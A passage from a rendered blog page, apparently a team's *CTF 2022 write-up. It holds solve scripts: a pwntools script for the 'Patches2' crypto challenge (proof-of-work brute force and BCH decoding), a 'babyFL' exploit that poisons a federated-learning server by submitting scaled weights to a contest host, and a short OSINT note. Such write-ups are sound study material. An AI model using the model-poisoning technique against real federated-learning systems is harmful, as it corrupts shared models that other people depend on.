+        <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">127</span>):
+            <span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">127</span>):
+                strings <span style="color:#f92672">=</span> chr(i) <span style="color:#f92672">+</span> chr(j) <span style="color:#f92672">+</span> chr(k) <span style="color:#f92672">+</span> chr(m) <span style="color:#f92672">+</span> leave
+                s <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256()    
+                s<span style="color:#f92672">.</span>update(strings<span style="color:#f92672">.</span>encode())    
+                b <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>hexdigest()
+                <span style="color:#66d9ef">if</span> b <span style="color:#f92672">==</span> sha256:
+                    key<span style="color:#f92672">=</span>chr(i) <span style="color:#f92672">+</span> chr(j) <span style="color:#f92672">+</span> chr(k) <span style="color:#f92672">+</span> chr(m)
+                    print(key)
+                    pd<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+                    <span style="color:#66d9ef">break</span>
+            <span style="color:#66d9ef">if</span> pd<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
+                <span style="color:#66d9ef">break</span>
+        <span style="color:#66d9ef">if</span> pd<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
+            <span style="color:#66d9ef">break</span>
+    <span style="color:#66d9ef">if</span> pd<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">break</span>
+p<span style="color:#f92672">.</span>send(key)
+<span style="color:#66d9ef">for</span> la <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">50</span>):
+   
+    bits <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">15</span>
+    res<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+    res2<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">15</span>):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Ask Patches:&#34;</span>,BCHcode[i])
+        p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Patches answers: &#34;</span>)
+        recvbool<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>)
+        <span style="color:#66d9ef">if</span> recvbool<span style="color:#f92672">==</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;T&#39;</span>:
+            bits[i]<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+    print(bits)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">15</span>):
+        <span style="color:#66d9ef">if</span> bits[i]<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
+            res<span style="color:#f92672">^=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span>i
+            res2<span style="color:#f92672">^=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#ae81ff">3</span><span style="color:#f92672">*</span>i)
+    pd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> <span style="color:#ae81ff">15</span>:
+                bits[i] <span style="color:#f92672">=</span> f(bits[i])
+            <span style="color:#66d9ef">if</span> j <span style="color:#f92672">!=</span> <span style="color:#ae81ff">15</span>:
+                bits[j] <span style="color:#f92672">=</span> f(bits[j])
+            res <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+            res2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">15</span>):
+                <span style="color:#66d9ef">if</span> bits[k] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+                    res <span style="color:#f92672">^=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> k
+                    res2 <span style="color:#f92672">^=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> k)
+            _, mod <span style="color:#f92672">=</span> GFDiv(res, <span style="color:#ae81ff">19</span>)
+            _, mod2 <span style="color:#f92672">=</span> GFDiv(res2, <span style="color:#ae81ff">4681</span>)
+            <span style="color:#66d9ef">if</span> mod <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> mod2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+                pd <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+                <span style="color:#66d9ef">break</span>
+            <span style="color:#66d9ef">else</span>:
+                <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> <span style="color:#ae81ff">15</span>:
+                    bits[i] <span style="color:#f92672">=</span> f(bits[i])
+                <span style="color:#66d9ef">if</span> j <span style="color:#f92672">!=</span> <span style="color:#ae81ff">15</span>:
+                    bits[j] <span style="color:#f92672">=</span> f(bits[j])
+        <span style="color:#66d9ef">if</span> pd <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+            <span style="color:#66d9ef">break</span>
+    res <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">15</span>):
+        <span style="color:#66d9ef">if</span> bits[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+            res <span style="color:#f92672">^=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i
+    C, _ <span style="color:#f92672">=</span> GFDiv(res, <span style="color:#ae81ff">465</span>)
+    print(bin(C))
+    pay <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    print(_)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
+        pay <span style="color:#f92672">+=</span> str(C <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span>
+        C <span style="color:#f92672">//=</span> <span style="color:#ae81ff">2</span>
+    pay<span style="color:#f92672">=</span>pay<span style="color:#f92672">.</span>strip()
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Now open the chests:&#34;</span>,pay)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="misc">Misc</h2>
+<h3 id="babyfl">babyFL</h3>
+<p>联邦学习，我们能控制20个客户端，想办法用提交的参数数据污染掉服务端的训练过程让测试达到0.95精度即可，下面分别是exp、训练脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#75715e"># context(log_level=&#39;debug&#39;)</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;124.70.158.154&#39;</span>, <span style="color:#ae81ff">8081</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_val</span>(arr):
+    <span style="color:#66d9ef">if</span> len(arr<span style="color:#f92672">.</span>shape) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">for</span> temp <span style="color:#f92672">in</span> arr:
+            get_val(temp)
+    <span style="color:#66d9ef">else</span>:
+        l <span style="color:#f92672">=</span> len(arr)
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(l):
+            arr[i] <span style="color:#f92672">=</span> float(input())
+res <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>load(<span style="color:#e6db74">&#39;./save/final.npy&#39;</span>, allow_pickle<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+<span style="color:#75715e"># for i in range(8):</span>
+<span style="color:#75715e">#     mtx = res[i][0] * 1000</span>
+<span style="color:#75715e">#     try:</span>
+<span style="color:#75715e">#         for j in mtx:</span>
+idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+mtx <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> mtx:
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> i:
+        <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> j:
+            <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> k:
+                p<span style="color:#f92672">.</span>sendline(str(l)<span style="color:#f92672">.</span>encode())
+                idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+mtx <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> mtx:
+    p<span style="color:#f92672">.</span>sendline(str(i)<span style="color:#f92672">.</span>encode())
+    idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+mtx <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> mtx:
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> i:
+        <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> j:
+            <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> k:
+                p<span style="color:#f92672">.</span>sendline(str(l)<span style="color:#f92672">.</span>encode())
+                idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+mtx <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">3</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> mtx:
+    p<span style="color:#f92672">.</span>sendline(str(i)<span style="color:#f92672">.</span>encode())
+    idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+mtx <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">4</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> mtx:
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> i:
+        p<span style="color:#f92672">.</span>sendline(str(j)<span style="color:#f92672">.</span>encode())
+        idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+mtx <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">5</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> mtx:
+    p<span style="color:#f92672">.</span>sendline(str(i)<span style="color:#f92672">.</span>encode())
+    idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+mtx <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">6</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> mtx:
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> i:
+        p<span style="color:#f92672">.</span>sendline(str(j)<span style="color:#f92672">.</span>encode())
+        idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+
+mtx <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">7</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> mtx:
+    p<span style="color:#f92672">.</span>sendline(str(i)<span style="color:#f92672">.</span>encode())
+    idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+print(idx)
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> traceback
+<span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
+<span style="color:#f92672">from</span> tensorflow.keras <span style="color:#f92672">import</span> Sequential
+<span style="color:#f92672">from</span> tensorflow.keras.layers <span style="color:#f92672">import</span>  Dense, Conv2D, Flatten, MaxPooling2D
+<span style="color:#f92672">from</span> tensorflow <span style="color:#f92672">import</span> keras
+<span style="color:#f92672">from</span> tensorflow.keras.models <span style="color:#f92672">import</span> load_model
+<span style="color:#f92672">from</span> tensorflow.keras.datasets <span style="color:#f92672">import</span> mnist
+participant_number <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new_model</span>():
+    model <span style="color:#f92672">=</span> Sequential()
+    model<span style="color:#f92672">.</span>add(Conv2D(<span style="color:#ae81ff">10</span>, (<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">3</span>), input_shape<span style="color:#f92672">=</span>(<span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">1</span>)))
+    model<span style="color:#f92672">.</span>add(MaxPooling2D(pool_size<span style="color:#f92672">=</span>(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>)))
+    model<span style="color:#f92672">.</span>add(Conv2D(<span style="color:#ae81ff">20</span>, (<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">3</span>)))
+    model<span style="color:#f92672">.</span>add(Flatten())
+    model<span style="color:#f92672">.</span>add(Dense(units<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>, activation<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;relu&#39;</span>))
+    model<span style="color:#f92672">.</span>add(Dense(units<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>, activation<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;softmax&#39;</span>))
+    model<span style="color:#f92672">.</span>compile(loss<span style="color:#f92672">=</span>keras<span style="color:#f92672">.</span>losses<span style="color:#f92672">.</span>SparseCategoricalCrossentropy(), metrics<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;accuracy&#39;</span>],
+                  optimizer<span style="color:#f92672">=</span>keras<span style="color:#f92672">.</span>optimizers<span style="color:#f92672">.</span>Adam(lr<span style="color:#f92672">=</span><span style="color:#ae81ff">0.001</span>))
+    <span style="color:#66d9ef">return</span> model
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_test_data</span>():
+    (_, _), (x, y) <span style="color:#f92672">=</span> mnist<span style="color:#f92672">.</span>load_data()
+    l <span style="color:#f92672">=</span> len(y)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(l):
+        y[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span> <span style="color:#f92672">-</span> y[i]
+    x <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>reshape(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">return</span> x, y
+
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">train_models</span>():
+    (x, y), (_, _) <span style="color:#f92672">=</span> mnist<span style="color:#f92672">.</span>load_data()
+    x <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>reshape(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(participant_number):
+        model <span style="color:#f92672">=</span> new_model()
+        model<span style="color:#f92672">.</span>fit(x, y, batch_size<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>, epochs<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
+        model<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#34;./model/&#34;</span><span style="color:#f92672">+</span>str(i))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aggregation</span>(parameters):
+    print(<span style="color:#e6db74">&#39;aggregation&#39;</span>)
+    weights <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> layer <span style="color:#f92672">in</span> parameters:
+        sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        l <span style="color:#f92672">=</span> len(layer)
+        <span style="color:#66d9ef">for</span> temp <span style="color:#f92672">in</span> layer:
+            sum <span style="color:#f92672">=</span> sum <span style="color:#f92672">+</span> temp
+        weights<span style="color:#f92672">.</span>append(sum <span style="color:#f92672">/</span> l)
+        <span style="color:#75715e"># weights.append(layer[2])</span>
+    model <span style="color:#f92672">=</span> new_model()
+    l <span style="color:#f92672">=</span> len(model<span style="color:#f92672">.</span>get_weights())
+    model<span style="color:#f92672">.</span>set_weights(weights)
+    <span style="color:#66d9ef">return</span> model
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span>(model):
+    print(<span style="color:#e6db74">&#39;test&#39;</span>)
+    my_x, my_y <span style="color:#f92672">=</span> load_test_data()
+    loss, acc <span style="color:#f92672">=</span> model<span style="color:#f92672">.</span>evaluate(my_x, my_y, batch_size<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>)
+    print(loss, acc)
+    <span style="color:#66d9ef">if</span> acc <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0.95</span>:
+        f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./flag&#39;</span>)
+        print(f<span style="color:#f92672">.</span>read())
+    <span style="color:#66d9ef">else</span>:
+        print(<span style="color:#e6db74">&#34;you fail&#34;</span>, acc)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_parameters</span>():
+    print(<span style="color:#e6db74">&#39;load parameter&#39;</span>)
+    parameters <span style="color:#f92672">=</span> []
+    models <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(participant_number):
+        models<span style="color:#f92672">.</span>append(load_model(<span style="color:#e6db74">&#34;./inv_model/&#34;</span><span style="color:#f92672">+</span>str(i)))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+        layer <span style="color:#f92672">=</span> []
+        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(participant_number):
+            temp <span style="color:#f92672">=</span> models[j]<span style="color:#f92672">.</span>get_weights()
+            layer<span style="color:#f92672">.</span>append(temp[i])
+        parameters<span style="color:#f92672">.</span>append(layer)
+    <span style="color:#66d9ef">return</span> parameters
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_parameters1</span>():
+    print(<span style="color:#e6db74">&#39;load parameter1&#39;</span>)
+    parameters <span style="color:#f92672">=</span> []
+    models <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(participant_number):
+        models<span style="color:#f92672">.</span>append(load_model(<span style="color:#e6db74">&#34;./model/&#34;</span><span style="color:#f92672">+</span>str(i)))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+        layer <span style="color:#f92672">=</span> []
+        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(participant_number):
+            temp <span style="color:#f92672">=</span> models[j]<span style="color:#f92672">.</span>get_weights()
+            layer<span style="color:#f92672">.</span>append(temp[i])
+        parameters<span style="color:#f92672">.</span>append(layer)
+    <span style="color:#66d9ef">return</span> parameters
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_val</span>(arr):
+    <span style="color:#66d9ef">if</span> len(arr<span style="color:#f92672">.</span>shape) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">for</span> temp <span style="color:#f92672">in</span> arr:
+            get_val(temp)
+    <span style="color:#66d9ef">else</span>:
+        l <span style="color:#f92672">=</span> len(arr)
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(l):
+            arr[i] <span style="color:#f92672">=</span> float(input())
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_input_parameter</span>(parameters):
+    print(<span style="color:#e6db74">&#39;get input parameter&#39;</span>)
+    res <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>load(<span style="color:#e6db74">&#39;./save/final.npy&#39;</span>, allow_pickle<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> layer <span style="color:#f92672">in</span> parameters:
+        input_weight <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>zeros(layer[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>shape)
+        print(<span style="color:#e6db74">&#34;next layer:&#34;</span>)
+        <span style="color:#75715e"># get_val(input_weight)</span>
+        input_weight <span style="color:#f92672">=</span> res[i][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>
+        layer<span style="color:#f92672">.</span>append(input_weight)
+        i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+    <span style="color:#66d9ef">return</span> parameters
+
+<span style="color:#75715e"># 8 * 20 * (3 * 3 * 1 * 10)</span>
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    parameters1 <span style="color:#f92672">=</span> load_parameters1()
+    np<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#39;./save/final&#39;</span>, parameters1)
+    <span style="color:#75715e"># model1 = aggregation(parameters1)</span>
+    <span style="color:#75715e"># test(model1)</span>
+    <span style="color:#75715e"># parameters2 = load_parameters()</span>
+    <span style="color:#75715e"># np.save(&#39;./save/final2&#39;, parameters2)</span>
+    
+    <span style="color:#75715e"># model2 = aggregation(parameters2)</span>
+    <span style="color:#75715e"># test(model2)</span>
+    
+    <span style="color:#75715e"># print(len(parameters))</span>
+    <span style="color:#75715e"># print(parameters)</span>
+    parameters <span style="color:#f92672">=</span> load_parameters()
+    <span style="color:#75715e"># np.save(&#39;./save/final&#39;, parameters)</span>
+    parameters <span style="color:#f92672">=</span> get_input_parameter(parameters)
+    model <span style="color:#f92672">=</span> aggregation(parameters)
+    test(model)
+</code></pre></div><h3 id="today">Today</h3>
+<p>根据题目信息推测出在上海，通过一家农夫生鲜水果店，找到对面的小区，在地图评论区找到flag</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 185; 
+			flex-basis: 444px"
+	>
+	<a href="/post/starctf2022-writeup-by-or4nge/Today_1.png" data-size="750x405">
+		<img src="/post/starctf2022-writeup-by-or4nge/Today_1.png"
+			width="750"
+			height="405"
+			srcset="/post/starctf2022-writeup-by-or4nge/Today_1_hu4e4790ea4dd16fdde92018eed9ecc859_300799_480x0_resize_box_3.png 480w, /post/starctf2022-writeup-by-or4nge/Today_1_hu4e4790ea4dd16fdde92018eed9ecc859_300799_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 or4nge
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#oh-my-notepro">oh-my-notepro</a></li>
+        <li><a href="#oh-my-lotto">oh-my-lotto</a></li>
+        <li><a href="#oh-my-grafana">oh-my-grafana</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#examination">examination</a></li>
+        <li><a href="#ping">ping</a></li>
+      </ul>
+    </li>
+    <li><a href="#re">Re</a>
+      <ul>
+        <li><a href="#simple-file-system">Simple File System</a></li>
+        <li><a href="#jump">Jump</a></li>
+        <li><a href="#nacl">NaCl</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#ezrsa">ezRSA</a></li>
+        <li><a href="#patches2">Patches2</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#babyfl">babyFL</a></li>
+        <li><a href="#today">Today</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
